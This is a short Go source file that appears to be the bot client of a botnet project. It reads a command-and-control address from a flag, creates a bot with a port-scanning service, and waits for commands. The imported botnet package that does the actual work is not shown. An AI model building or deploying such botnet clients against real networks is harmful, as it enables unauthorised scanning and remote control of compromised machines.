package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/threeaccents/botnet/tcp"
)

var (
	ccAddrPtr = flag.String("ccaddr", "127.0.0.1:9090", "the full address of the command and control center")
)

func main() {
	flag.Parse()

	bot, err := tcp.NewBot(*ccAddrPtr, &tcp.PortScanService{})
	if err != nil {
		log.Panic(err)
	}
	bot.Listen()
	fmt.Sprintln()
}
